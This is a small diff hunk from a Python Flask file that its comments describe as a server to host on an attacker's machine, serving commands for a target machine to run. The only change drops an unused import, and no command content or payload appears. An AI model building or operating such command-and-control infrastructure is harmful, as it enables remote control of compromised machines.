@@ -1,7 +1,7 @@
 # flask server to host on attackers machine
 # Provides an endpoint which will return a list of commands to run on the target machine
 
-import flask, rsa
+import flask
 from Crypto.PublicKey import RSA
 
 app = flask.Flask(__name__)
